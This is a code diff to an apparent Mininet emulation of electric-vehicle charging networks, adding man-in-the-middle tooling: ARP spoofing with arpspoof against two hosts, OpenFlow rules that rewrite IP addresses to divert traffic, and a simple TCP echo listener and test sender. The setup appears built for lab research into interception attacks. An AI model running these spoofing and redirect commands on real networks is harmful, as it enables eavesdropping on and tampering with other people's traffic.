@@ -8,6 +8,7 @@ import fileinput
 import random
 import string
 import sys
+import socket, threading # for MiM
 from os import popen
 
 from mininet.term import makeTerm
@@ -68,6 +69,23 @@ class Electric(Node):
             if line.strip().startswith('network.interface'):
                 line = 'network.interface = {}\n'.format(intfName)
             sys.stdout.write(line)
+
+    def test_send(self, rec):
+        """Test send to MiM via TCP """
+        TCP_IP = rec.IP()
+        TCP_PORT = 2000
+        BUFFER_SIZE = 1024
+        MESSAGE = 'Test'
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((TCP_IP, TCP_PORT))
+            s.send(MESSAGE)
+            data = s.recv(BUFFER_SIZE)
+            s.close()
+            print("received: ", data)
+        except:
+            print("cant connect")
 
 
 class EV(Electric):
@@ -192,13 +210,14 @@ class MiMOVSSwitch( OVSSwitch ):
            batch: enable batch startup (False)"""
         OVSSwitch.__init__( self, name, **params )
 
-    def dpctl( self, *args ):
-        "Run ovs-ofctl command"
-        return self.cmd( 'ovs-ofctl', *args )
-
-    def add_mim( self, source, target, mim ):
+    def add_mim_flows( self, source, target, mim ):
+        """Sets the flows for a MiM switch.
+        :param source: the source (e.g. se1)
+        :param target: the target (e.g. ev1)
+        :param mim: the MiM node (e.g. mim)"""
         # BEWARE THIS IS IPV4
 
+        # CLI EXAMPLE
         # sh ovs-ofctl add-flow s1 dl_src=00:00:00:00:00:01,dl_dst=00:00:00:00:00:03,actions=mod_nw_dst:10.0.0.3,output:3
         # sh ovs-ofctl add-flow s1 dl_src=00:00:00:00:00:03,dl_dst=00:00:00:00:00:01,actions=mod_nw_src:10.0.0.2,output:1
         # sh ovs-ofctl add-flow s1 dl_type=0x806,nw_proto=1,actions=flood
@@ -225,9 +244,36 @@ class MiMNode( Node ):
     def __init__( self, name, source=None, inNamespace=True, **params ):
         Node.__init__(  self, name, inNamespace=True, **params  )
 
+    def __exit__( self ):
+        self.stop_receive = True
+
     def start_arpspoof( self, source, target ):
+
+        # CLI EXAMPLE
+        # arpspoof -i h3-eth0 -c own -t 10.0.0.1 10.0.0.2 2>/dev/null 1>/dev/null & # send arp reply
+
         # fake MAC in arp table of source
         self.cmd("arpspoof", "-i mim-eth0", "-t %s" % source.IP(), "%s" % target.IP(), " 2>/dev/null 1>/dev/null &")
         # fake MAC in arp table of target
         self.cmd("arpspoof", "-i mim-eth0", "-t %s" % target.IP(), "%s" % source.IP(), " 2>/dev/null 1>/dev/null &")
-        # arpspoof -i h3-eth0 -c own -t 10.0.0.1 10.0.0.2 2>/dev/null 1>/dev/null & # send arp reply
+
+    # def receive_thread( self ):
+    #     receive_thread = threading.Thread(target=self.receive, name="Receive")
+    #     receive_thread.start()
+
+    def receive ( self ):
+        TCP_IP = ''
+        TCP_PORT = 2000
+        BUFFER_SIZE = 20
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((TCP_IP, TCP_PORT))
+        s.listen(1)
+
+        conn, addr = s.accept()
+        while not self.stop_receive:
+            data = conn.recv(BUFFER_SIZE)
+            if not data:
+                break
+            conn.send(data)
+        conn.close()
